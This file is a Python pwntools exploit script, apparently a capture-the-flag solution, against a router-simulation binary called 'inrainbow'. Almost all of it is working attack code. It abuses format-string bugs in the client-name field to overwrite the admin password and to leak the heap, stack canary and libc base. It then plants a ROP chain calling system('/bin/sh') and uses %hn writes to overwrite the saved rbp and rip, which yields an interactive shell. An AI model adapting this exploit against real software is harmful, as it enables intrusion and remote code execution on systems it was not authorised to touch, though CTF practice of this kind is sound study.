#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'inrainbow_patched'
HOST = 'example.com'
PORT = 1337

exe = ELF(exe_path, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.39.so",  checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
break *main+402
break *connect_client+110
break *show_status
break *admin_login+63
break *list_clients
break *show_log
break *debug_log+227
c
'''
#set $rip = admin_login+91
def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def sl(data):
    p.sendline(data)
def s(data):
    p.send(data)

# add payload, script here
'''
# start of active heap
######################################################################## 0x40 bytes
========================================= struct router
admin_pass [16]
16 bytes padding
INRAINBOWROUTER [16] #ssid
16 bytes padding
=========================================
################################################################################## 0x2c0 bytes
========================================= struct client
name [32]
ip [32] (16 bytes ip, 16 bytes padding)
connected bytes
========================================= 0x44 * 10 = 0x2a8 bytes
admin_logged_in connected_clients  8 bytes
16 bytes padding
################################################################################## 0x40 bytes
========================================= struct user
username[32]
password[32]
=========================================
########################################################################
'''

'''
leak heap + stack + anon
%6$p.%9$p.%10$p

- change admin password[16] using connect client -> client name = b'%u%6$n' ("H")
- overwrite __free_hook with system 
- set password = "/bin/sh" using config -> edit admin password
'''
sa(b'Enter username: ', b'M'*31)
sa(b'Enter password: ', b'N'*31)

ip = b'1.1.1.1'

# overwrite admin password into "H" with format string
sla(b'> ', b'4')
sla(b'Client name: ', b'%65u%6$n')
sa(b'IP: ', b'255.255.255.255' + b'W'*16)

# admin login
sla(b'> ', b'2')
sla(b'Admin password:', b'H' + b'\x00'*3)
sla(b'> ', b'1')

# change firewall config to trigger format string
sla(b'> ', b'3')
sla(b'> ', b'4')
sla(b'Enter new firewall config: ', b'T')
sla(b'> ', b'5')

# leak heap and anon and saved main rbp and canary
sla(b'> ', b'4')
sla(b'Client name: ', b'Y%6$p%10$p.%63$p.%16$p')
sa(b'IP: ', b'255.255.255.255' + b'V'*16)
sla(b'> ', b'6')
p.recvuntil(b'Y')
heap_leak = int(p.recvuntil(b'\n')[:-1],16)
anon_leak = int(p.recvuntil(b'.')[:-1],16)
rbp_leak = int(p.recvuntil(b'.')[:-1],16)
canary = int(p.recvuntil(b' connected')[:-10],16)

heap_base = heap_leak - 0x6e0
anon_base = anon_leak - 0x5320
libc_base = anon_base - 0x205000
rip_leak = rbp_leak + 0x8

log.info(f"canary: {hex(canary)}")
log.info(f"heap_base: {hex(heap_base)}")
log.info(f"anon_base: {hex(anon_base)}")
log.info(f"libc_base: {hex(libc_base)}")
log.info(f"rbp_leak: {hex(rbp_leak)}")

ret = 0x2882f + libc_base
pop_rdi = 0x10f78b + libc_base
binsh = 0x1cb42f + libc_base
system = 0x58750 + libc_base
leave_ret = 0x299d2 + libc_base
log.info(f"ret: {hex(ret)}")
log.info(f"pop_rdi: {hex(pop_rdi)}")
log.info(f"binsh: {hex(binsh)}")
log.info(f"system: {hex(system)}")
log.info(f"leave_ret: {hex(leave_ret)}")

# overwrite route->ssid
sla(b'> ', b'3')
sla(b'> ', b'2')
payload = p64(pop_rdi) + p64(binsh) + p64(system)
sla(b'New SSID: ', payload)

# overwrite admin password 
sla(b'> ', b'1')
payload = b'A'*16 + p64(canary)
sla(b'Enter new password: ', payload)

# change firewall config to trigger format string
sla(b'> ', b'4')
sla(b'Enter new firewall config: ', b'T')
sla(b'> ', b'5')

# overwrite

dest = 0x6f8 + heap_base
offset = 27

def connect_client(name, ip):
    sla(b'> ', b'4')
    sla(b'Client name: ', name)
    sla(b'IP: ', ip)

prefix = 7
# overwrite saved rbp
for i in range(3):
    value = (dest >> (16*i)) & 0xffff
    target = rbp_leak + i*2
    delta = (value - prefix) & 0xffff
    name = f'%{delta}c%{offset}$hn'.encode()
    ip = b'200.200.200.200\x00' + p64(target)
    connect_client(name, ip)
    written = value
# overwrite saved rip
dest = leave_ret
for i in range(3):
    value = (dest >> (16*i)) & 0xffff
    target = rip_leak + i*2
    delta = (value - prefix) & 0xffff
    name = f'%{delta}c%{offset}$hn'.encode()
    ip = b'200.200.200.200\x00' + p64(target)
    connect_client(name, ip)
    written = value

#p.sendline(b'ls')
p.interactive()
